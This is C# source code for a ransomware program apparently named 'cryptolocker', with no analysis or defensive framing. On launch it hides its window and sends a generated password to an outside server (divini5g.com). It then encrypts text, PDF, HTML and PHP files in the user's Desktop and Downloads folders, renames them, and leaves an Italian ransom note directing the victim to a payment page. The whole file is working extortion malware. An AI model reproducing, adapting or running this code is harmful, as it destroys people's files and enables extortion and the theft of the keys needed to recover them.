using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;


namespace cryptolocker
{
    public partial class Form1 : Form
    {
        //Url to send encryption password and computer info
        string targetURL = "http://www.divini5g.com/cryptolocker/write.php?info=";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";
        string codiceutente;



        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        try
                        {
                            cs.Close();
                        }
                        catch (System.Security.Cryptography.CryptographicException)
                        { }
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //creates random password for encryption
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHI/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--){
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        //crea un codice utente random
        public string CreaCodice(int length)
        {
            const string valid = "v3mYknL9NhszQetJzhE7Ftdwdq8XT7Hy";
            StringBuilder res2 = new StringBuilder();
            Random rnd2 = new Random();
            while (0 < length--)
            {
                res2.Append(valid[rnd2.Next(valid.Length)]);
            }
            return res2.ToString();
        }

        //Sends created password target location
        public void SendPassword(string password){
            
            string info = computerName + "-" + userName + " " + password;
            codiceutente= CreaCodice(15);
            string utente = codiceutente + "&password=";
            var fullUrl = targetURL + utente + password;
            var conent = new System.Net.WebClient().DownloadString(fullUrl);
        }

        //Encrypts single file
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file+".divini5g");

            
            

        }

        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {
            
            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".pdf", ".html", ".php"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++){
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i],password);
                }
            }
            for (int i = 0; i < childDirectories.Length; i++){
                encryptDirectory(childDirectories[i],password);
            }
            
            
        }

        public void startAction()
        {
            string password = CreatePassword(15);
            //codifica dei dati all'interno del desktop
            string path = "\\Desktop";
            string startPath = userDir + userName + path;
            SendPassword(password);
            encryptDirectory(startPath,password);
            //codifica dei dati all'interno della cartella download
            path = "\\Downloads";
            startPath = userDir + userName + path;
            encryptDirectory(startPath, password);
            messageCreator();
            password = null;
            System.Windows.Forms.Application.Exit();
        }

        public void messageCreator()
        {
            string path = "\\Desktop\\READ_IT.txt";
            string fullpath = userDir + userName + path;
            string[] lines = { "I tuoi file sono appena stati criptati.", "Collegati alla pagina www.divini5g.com/cryptolocker/payment.php", "ed inserisci questo codice: " + codiceutente };
            System.IO.File.WriteAllLines(fullpath, lines);
        }
    }
}
